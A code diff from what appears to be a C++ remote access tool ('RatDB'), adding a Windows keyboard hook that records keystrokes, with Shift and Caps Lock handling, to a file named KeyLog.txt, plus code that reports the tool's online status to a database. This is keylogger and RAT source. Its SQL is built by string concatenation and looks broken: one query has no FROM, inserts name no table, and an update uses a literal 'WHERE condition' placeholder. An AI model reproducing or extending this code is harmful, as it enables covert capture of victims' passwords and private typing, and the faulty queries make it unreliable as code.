@@ -29,12 +29,27 @@ KeyLogger KL;
 
 LRESULT __stdcall HookCallbackKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	if (nCode >= 0)
-	{
-		*KL.GetKBDS() = *((KBDLLHOOKSTRUCT*)lParam);
-		if (wParam == WM_KEYDOWN) {
-			char c = MapVirtualKey(KL.GetKBDS()->vkCode, 2);
-			cout << c << endl;
+	bool caps = GetKeyState(VK_CAPITAL);
+	if (KL.getEnabled()) {
+
+		if (GetKeyState(VK_CAPITAL)) {
+			caps = !caps;
+		}
+		if (nCode >= 0)
+		{
+			*KL.GetKBDS() = *((KBDLLHOOKSTRUCT*)lParam);
+			if (wParam == WM_KEYDOWN) {
+				char c;
+				if (GetKeyState(VK_SHIFT)^caps) {
+					c=MapVirtualKey(KL.GetKBDS()->vkCode, 2);
+				}
+				else {
+					c=tolower(MapVirtualKey(KL.GetKBDS()->vkCode, 2));
+				}
+				ofstream out("KeyLog.txt", fstream::app);
+				out << c;
+				out.close();
+			}
 		}
 	}
 	return CallNextHookEx(*KL.GetHK(), nCode, wParam, lParam);
@@ -81,6 +96,20 @@ int main(int argc, char** argv)
 	if (RatDB.Init()) {
 		UFuncts::printfC("Connected to DB!", 2, 0, 1, 0);
 		printf("\n");
+	}
+
+	//check DB for own existance
+	if (RatDB.Query("SELECT EXISTS(SELECT * WHERE Name='" + ServerName + "')")) {
+		if (RatDB.GetRow()) {
+			if (RatDB.row[0]) {
+				//Tell DB we are online
+				RatDB.Query("UPDATE "+DatabaseName+" SET Online = 1 WHERE condition");
+			}
+			else {
+				//if we dont exist create entry
+				RatDB.Query("Insert (Name, Port, Online, Keylogging) VALUES ('" + ServerName + "','" + to_string(Port) + "','" + to_string(1) + "','" + to_string(0) + "')");
+			}
+		}
 	}
 
 	UFuncts::StdOutRedirect stdoutRedirect(512);
@@ -137,6 +166,17 @@ int main(int argc, char** argv)
 	}
 	system("pause");
 	Master.DisConnect();
+
+	if (RatDB.Query("SELECT EXISTS(SELECT * WHERE Name='" + ServerName + "')")) {
+		if (RatDB.GetRow()) {
+			if (RatDB.row[0]) {
+				RatDB.Query("UPDATE " + DatabaseName + " SET Online = 0 WHERE condition");
+			}
+			else {
+				RatDB.Query("Insert (Name, Port, Online, Keylogging) VALUES ('" + ServerName + "','" + to_string(Port) + "','" + to_string(0) + "','" + to_string(0) + "')");
+			}
+		}
+	}
 	return 0;
 }
 
